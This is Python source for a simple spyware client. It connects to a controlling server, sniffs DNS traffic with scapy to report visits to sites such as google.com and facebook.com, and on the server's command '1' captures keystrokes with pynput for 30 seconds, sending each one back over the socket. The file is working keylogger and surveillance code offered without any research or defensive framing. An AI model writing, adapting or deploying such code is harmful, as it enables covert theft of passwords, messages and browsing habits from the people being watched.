import socket
import threading
import time
from pynput.keyboard import Listener
from scapy.all import *

HOST = '127.0.0.1'
PORT = 65432

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((HOST, PORT))
print("Connected to server at", HOST, "on port", PORT)

# List of websites to monitor
websites = ["example.com", "google.com", "yahoo.com", "facebook.com"]

# Dictionary to keep track of which websites are open
site_status = {site: False for site in websites}

# Function to trigger when the site is opened
def site_opened(site):
    print(f"[{time.ctime()}] {site} is opened!")
    connection.send(f"[{time.ctime()}] {site} is opened!".encode())

# Function to handle DNS packet sniffing
def packet_callback(pkt):
    global site_status

    # Check if the packet is a DNS response (query/answer)
    if pkt.haslayer(DNS):
        # Handle DNS Response (qr == 1 means it's a response)
        if pkt[DNS].qr == 1:
            for site in websites:
                try:
                    # Check if the DNS response is for one of the websites
                    if site in pkt[DNS].an.rdata.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    continue

        # Handle DNS Request (qr == 0 means it's a request)
        elif pkt[DNS].qr == 0:
            for site in websites:
                try:
                    if site in pkt[DNS].qd.qname.decode('utf-8', errors='ignore'):
                        if not site_status[site]:
                            site_status[site] = True
                            site_opened(site)  # Trigger when the site is accessed
                except Exception as e:
                    continue

def send_site_info():
    print("Monitoring DNS traffic in real time...")
    sniff(prn=packet_callback, filter="udp port 53", store=0)

def sendKeystrokes():
    start_time = time.time()  # Track the start time

    def on_press(key):
        # Check if 30 seconds have passed, if yes stop listening
        if time.time() - start_time > 30:
            print("30 seconds elapsed, stopping keystroke capture.")
            return False  # Stops the listener
        try:
            key_data = str(key)
            connection.sendall(key_data.encode('utf-8'))  # Send the keystroke to the server
        except Exception as e:
            print(f"Error sending keystroke: {e}")

    # Start the keyboard listener
    with Listener(on_press=on_press) as listener:
        listener.join()  # Block the main thread until the listener stops


siteScannerThread = threading.Thread(target=send_site_info)
siteScannerThread.start()

while True:
    command = connection.recv(1024).decode()
    if not command:
        break
    if command == "1":
        print("Sending keystrokes...")
        sendKeystrokes()

connection.close()